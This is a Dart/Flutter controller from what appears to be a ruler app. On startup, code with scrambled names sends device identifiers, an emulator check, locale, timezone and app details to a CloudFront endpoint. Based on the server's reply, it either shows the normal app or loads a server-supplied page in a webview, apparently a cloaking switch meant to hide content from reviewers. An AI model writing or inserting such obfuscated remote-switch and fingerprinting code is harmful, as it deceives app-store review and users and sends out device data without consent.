import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class RulerInitLogic extends GetxController {

  var ilxpfswou = RxBool(false);
  var lgwahe = RxBool(true);
  var scqdn = RxString("");
  var hybazti = RxBool(false);
  var zlykfq = RxBool(true);
  final cgsprmwvnk = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    wgru();
  }


  Future<void> wgru() async {
    hybazti.value = true;
    zlykfq.value = true;
    lgwahe.value = false;

    cgsprmwvnk.post("https://d2gjqp7det9t81.cloudfront.net/RRrcvNW",data: await pzncluq()).then((value) {
      var toblp = value.data["toblp"] as String;
      var dobfka = value.data["dobfka"] as bool;
      if (dobfka) {
        scqdn.value = toblp;
        avzl();
      } else {
        cyghpsxt();
      }
    }).catchError((e) {
      lgwahe.value = true;
      zlykfq.value = true;
      hybazti.value = false;
    });
  }

  Future<Map<String, dynamic>> pzncluq() async {
    final DeviceInfoPlugin kyifru = DeviceInfoPlugin();
    PackageInfo lzstkd_vfdh = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var mpkyouas = Platform.localeName;
    var PqwLOIYh = currentTimeZone;

    var muHjWbw = lzstkd_vfdh.packageName;
    var NemXzBLE = lzstkd_vfdh.version;
    var XZnQai = lzstkd_vfdh.buildNumber;

    var rIRY = lzstkd_vfdh.appName;
    var jRJsWTKl = "";
    var kbhqVHKd  = "";
    var EwtRyHM = "";
    var ybsthfi = "";
    var rgpo = "";
    var gskw = "";
    var lcjhbrg = "";
    var gnom = "";


    var segRb = "";
    var LWcAMqBH = false;

    if (GetPlatform.isAndroid) {
      segRb = "android";
      var mywagv = await kyifru.androidInfo;

      EwtRyHM = mywagv.brand;

      jRJsWTKl  = mywagv.model;
      kbhqVHKd = mywagv.id;

      LWcAMqBH = mywagv.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      segRb = "ios";
      var cyzeloskx = await kyifru.iosInfo;
      EwtRyHM = cyzeloskx.name;
      jRJsWTKl = cyzeloskx.model;

      kbhqVHKd = cyzeloskx.identifierForVendor ?? "";
      LWcAMqBH  = cyzeloskx.isPhysicalDevice;
    }
    var res = {
      "rIRY": rIRY,
      "XZnQai": XZnQai,
      "NemXzBLE": NemXzBLE,
      "LWcAMqBH": LWcAMqBH,
      "jRJsWTKl": jRJsWTKl,
      "PqwLOIYh": PqwLOIYh,
      "EwtRyHM": EwtRyHM,
      "kbhqVHKd": kbhqVHKd,
      "mpkyouas": mpkyouas,
      "segRb": segRb,
      "ybsthfi" : ybsthfi,
      "rgpo" : rgpo,
      "gskw" : gskw,
      "lcjhbrg" : lcjhbrg,
      "muHjWbw": muHjWbw,
      "gnom" : gnom,

    };
    return res;
  }

  Future<void> cyghpsxt() async {
    Get.offNamed("/main");
  }

  Future<void> avzl() async {
    Get.offNamed("/stats_dash");
  }

}
